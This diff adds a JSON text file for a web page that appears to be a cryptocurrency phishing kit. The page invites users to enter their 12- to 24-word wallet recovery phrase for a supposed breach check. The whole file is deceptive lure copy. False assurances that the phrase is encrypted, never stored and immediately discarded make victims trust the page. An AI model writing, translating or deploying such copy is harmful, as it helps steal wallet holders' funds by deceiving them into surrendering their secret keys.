@@ -1,0 +1,64 @@
+﻿{
+  "mainTitle": "Check Your Wallet Security",
+  "description1": "We will conduct a secure check of your recovery phrase against our database of known security breaches. If we detect any exposure, we will provide immediate, guided steps to secure your wallet.",
+  "instructions": "Enter the confidential recovery phrase you generated when initializing your wallet.",
+  "phrase12": "I have a 12-word phrase",
+  "phrase15": "I have a 15-word phrase",
+  "phrase18": "I have an 18-word phrase",
+  "phrase21": "I have a 21-word phrase",
+  "phrase24": "I have a 24-word phrase",
+  "pasteInfo": "You can paste your entire Secret Recovery Phrase into any field.",
+  "errorMessage": "Secret Recovery Phrases must contain 12, 15, 18, 21, or 24 words.",
+  "confirmButton": "Check for Compromise",
+  "securityBtnText": "View Security Info",
+  "loaderText": "Verifying recovery phrase...",
+  "modalTitle": "Security Information",
+  "bestPracticesTitle": "Security Best Practices:",
+  "bestPracticesList": [
+    "Look for the secure HTTPS connection in your browser.",
+    "Use this feature only on private, trusted devices."
+  ],
+  "protectionTitle": "How We Keep You Safe:",
+  "protectionList": [
+    "All data is encrypted during transmission.",
+    "Your Secret Recovery Phrase is never stored on our servers."
+  ],
+  "modalNote": "Note: This security check scans databases for compromised wallets. Your Secret Recovery Phrase is used only for verification and is immediately discarded after processing.",
+  "languageOptions": {
+    "en": "English",
+    "es": "Español",
+    "fr": "Français",
+    "de": "Deutsch",
+    "it": "Italiano",
+    "pt": "Português",
+    "pt-br": "Português (Brasil)",
+    "nl": "Nederlands",
+    "sv": "Svenska",
+    "da": "Dansk",
+    "no": "Norsk",
+    "fi": "Suomi",
+    "pl": "Polski",
+    "ru": "Русский",
+    "uk": "Українська",
+    "cs": "Čeština",
+    "hu": "Magyar",
+    "ro": "Română",
+    "tr": "Türkçe",
+    "ar": "العربية",
+    "fa": "فارسی",
+    "hi": "हिन्दी",
+    "bn": "বাংলা",
+    "th": "ไทย",
+    "vi": "Tiếng Việt",
+    "id": "Bahasa Indonesia",
+    "ms": "Bahasa Melayu",
+    "fil": "Filipino",
+    "zh": "中文(简体)",
+    "zh-tw": "中文(繁體)",
+    "ja": "日本語",
+    "ko": "한국어"
+  }
+}
+
+
+
